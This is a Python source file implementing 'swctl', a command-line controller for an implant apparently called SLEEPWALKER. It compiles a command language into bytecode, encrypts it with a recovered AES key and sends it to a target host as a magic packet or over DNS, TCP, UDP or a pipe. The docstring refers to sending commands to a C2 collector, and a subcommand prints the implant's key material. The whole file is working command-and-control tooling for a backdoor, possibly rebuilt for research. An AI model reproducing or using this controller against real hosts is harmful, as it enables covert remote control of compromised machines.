"""swctl - SLEEPWALKER controller CLI.

Compiles a human-readable DSL into the 23-opcode bytecode, encrypts it with
the recovered AES-256-CCM key, frames it for a chosen transport and sends it.

Examples:
  # Build a magic-packet trigger (print its hex, no send)
  python3 -m swctl build script.dsl --transport magic --hex

  # Send a command over TCP to a C2 collector
  python3 -m swctl send script.dsl --transport tcp --host 10.0.0.9 --port 443

  # Decode already-decrypted bytecode into an annotated tree
  python3 -m swctl decode 87012a0000
"""

from __future__ import annotations

import argparse
import json
import sys

from . import _cfg, framing, transport
from .bytecode import compile_program, decode_program, render_tree


def _build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="swctl", description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    sub = p.add_subparsers(dest="cmd", required=True)

    b = sub.add_parser("build", help="compile DSL and emit framed bytes")
    b.add_argument("dsl", help="path to the DSL script (or '-' for stdin)")
    b.add_argument("--transport", default="magic",
                   choices=["magic", "dns", "tcp", "udp"],
                   help="framing to use (default magic)")
    b.add_argument("--hex", action="store_true", help="print hex instead of raw bytes")
    b.add_argument("--tree", action="store_true", help="also print the decoded tree")

    s = sub.add_parser("send", help="compile DSL and send to a target")
    s.add_argument("dsl", help="path to the DSL script (or '-' for stdin)")
    s.add_argument("--transport", default="magic",
                   choices=sorted(transport.SENDERS), help="transport to use")
    s.add_argument("--host", required=True, help="target IP/host")
    s.add_argument("--port", type=int, default=53,
                   help="target port (default 53)")
    s.add_argument("--pipe", default="", help="pipe name (pipe transport)")

    d = sub.add_parser("decode", help="decode bytecode hex into a tree")
    d.add_argument("hex", help="bytecode as hex")

    k = sub.add_parser(
        "keys",
        help="show the active key config (config.json; defaults when unmodified)")
    k.add_argument("--json", action="store_true",
                   help="emit machine-readable JSON")

    return p


def _load_dsl(path: str) -> str:
    if path == "-":
        return sys.stdin.read()
    with open(path, "r", encoding="utf-8") as fh:
        return fh.read()


def _frame_for(program: bytes, transport_name: str) -> bytes:
    if transport_name == "magic":
        return framing.build_magic_packet(program)
    if transport_name == "dns":
        return framing.dns_label(program).encode("ascii")
    if transport_name == "tcp":
        return framing.tcp_frame(program)
    if transport_name == "udp":
        return framing.udp_datagram(program)
    raise ValueError(f"unknown framing: {transport_name}")


def main(argv: list | None = None) -> int:
    args = _build_parser().parse_args(argv)

    if args.cmd == "decode":
        data = bytes.fromhex(args.hex.replace(" ", ""))
        print(render_tree(decode_program(data)))
        return 0

    if args.cmd == "keys":
        cfg = _cfg.load()
        if args.json:
            print(json.dumps({
                "source": cfg.get("source"),
                "aes_key": cfg["aes_key"].hex(),
                "config_nonce": cfg["config_nonce"].hex(),
                "cron_xor_key": cfg["cron_xor_key"].hex(),
                "sniff_xor_const": f"0x{cfg['sniff_xor_const']:04X}",
            }, indent=2))
        else:
            print(f"source          : {cfg.get('source') or '(built-in defaults)'}")
            print(f"aes_key         : {cfg['aes_key'].hex()}")
            print(f"config_nonce    : {cfg['config_nonce'].hex()}")
            print(f"cron_xor_key    : {cfg['cron_xor_key'].hex()}")
            print(f"sniff_xor_const : 0x{cfg['sniff_xor_const']:04X}")
        return 0

    program = compile_program(_load_dsl(args.dsl))

    if args.cmd == "build":
        framed = _frame_for(program, args.transport)
        if args.hex:
            print(framed.hex())
        else:
            sys.stdout.buffer.write(framed)
            sys.stdout.buffer.write(b"\n")
        if args.tree:
            print("\n-- decoded tree --")
            print(render_tree(decode_program(program)))
        return 0

    # send
    sender = transport.SENDERS[args.transport]
    if args.transport == "magic":
        sender(program, args.host)
    elif args.transport == "dns":
        sender(program, args.host, args.port)
    elif args.transport == "tcp":
        sender(program, args.host, args.port)
    elif args.transport == "udp":
        sender(program, args.host, args.port)
    elif args.transport == "pipe":
        sender(program, args.host, args.pipe)
    print(f"sent {args.transport} to {args.host}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
